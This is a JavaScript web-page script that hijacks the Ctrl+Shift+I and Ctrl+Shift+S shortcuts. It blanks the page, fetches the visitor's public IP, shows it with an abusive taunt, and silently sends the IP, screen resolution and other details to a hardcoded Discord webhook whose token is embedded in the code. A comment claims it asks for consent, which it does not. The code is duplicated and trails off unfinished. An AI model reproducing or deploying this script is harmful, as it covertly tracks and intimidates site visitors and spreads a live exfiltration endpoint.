document.addEventListener('keydown', function(event) {
  const body = document.getElementsByTagName('body');
  
  // Check if the Control and Shift keys are pressed, and the key is 'I' or 'i'
  if (event.ctrlKey && event.shiftKey && (event.key === "I" || event.key === "i" || event.key === "Ä±")) {
    event.preventDefault();
    
    // Display loading message
    body[0].innerHTML = "Loading...";
    
    // Prompt for consent to fetch IP address
      fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => {
          // Display IP address on the screen
          body[0].innerHTML = "Stop skidding fat fuck xkt on discord, Your IP: " + data.ip;
          
          // Obtain computer name
          const computerName = getComputerName();
          
          // Obtain screen resolution
          const screenResolution = getScreenResolution();
          
          // Obtain port number
          const portNumber = getLocationPort();
          
          // Send IP address, computer name, screen resolution, and port number to Discord webhook
          sendToDiscordWebhook(data.ip, computerName, screenResolution, portNumber);
        })
        .catch(error => {
          console.error('Error fetching IP:', error);
        });
    } else {

    }
  }
);

function getComputerName() {
  return navigator.computerName || 'Unknown';
}

function getScreenResolution() {
  return `${screen.width}x${screen.height}`;
}

function getLocationPort() {
  return location.port || 'Default';
}

function sendToDiscordWebhook(ipAddress, computerName, screenResolution, portNumber) {
  const webhookUrl = 'https://discord.com/api/webhooks/1236068101120987137/It2nncNILJRZb1ozOVzufRD2udtQ5QqCfy5zDi_KKjYaDimTdn_fpdRoL61_CX_OezZx';

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: `New IP address detected: ${ipAddress}, Computer Name: ${computerName}, Screen Resolution: ${screenResolution}, Port: ${portNumber}` }),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Failed to send IP address, computer name, screen resolution, and port number to Discord webhook');
    }
    console.log('IP address, computer name, screen resolution, and port number sent to Discord webhook successfully');
  })
  .catch(error => {
    console.error('Error sending IP address, computer name, screen resolution, and port number to Discord webhook:', error);
  });
}

 // ctrl + shift + s settings = 

 document.addEventListener('keydown', function(event) {
  const body = document.getElementsByTagName('body');
  
  // Check if the Control and Shift keys are pressed, and the key is 'I' or 'i'
  if (event.ctrlKey && event.shiftKey && (event.key === "S" || event.key === "s")) {
    event.preventDefault();
    
    // Display loading message
    body[0].innerHTML = "Loading...";
    
    // Prompt for consent to fetch IP address
      fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => {
          // Display IP address on the screen
          body[0].innerHTML = "Stop skidding fat fuck xkt on discord, Your IP: " + data.ip;
          
          // Obtain computer name
          const computerName = getComputerName();
          
          // Obtain screen resolution
          const screenResolution = getScreenResolution();
          
          // Obtain port number
          const portNumber = getLocationPort();
          
          // Send IP address, computer name, screen resolution, and port number to Discord webhook
          sendToDiscordWebhook(data.ip, computerName, screenResolution, portNumber);
        })
        .catch(error => {
          console.error('Error fetching IP:', error);
        });
    } else {

    }
  }
);

function getComputerName() {
  return navigator.computerName || 'Unknown';
}

function getScreenResolution() {
  return `${screen.width}x${screen.height}`;
}

function getLocationPort() {
  return location.port || 'Default';
}

function sendToDiscordWebhook(ipAddress, computerName, screenResolution, portNumber) {
  const webhookUrl = 'https://discord.com/api/webhooks/1236068101120987137/It2nncNILJRZb1ozOVzufRD2udtQ5QqCfy5zDi_KKjYaDimTdn_fpdRoL61_CX_OezZx';

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: `New IP address detected: ${ipAddress}, Computer Name: ${computerName}, Screen Resolution: ${screenResolution}, Port: ${portNumber}` }),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Failed to send IP address, computer name, screen resolution, and port number to Discord webhook');
    }
    console.log('IP address, computer name, screen resolution, and port number sent to Discord webhook successfully');
  })
  .catch(error => {
    console.error('Error sending IP address, computer name, screen resolution, and port number to Discord webhook:', error);
  });
}


// ctrl + shift + 
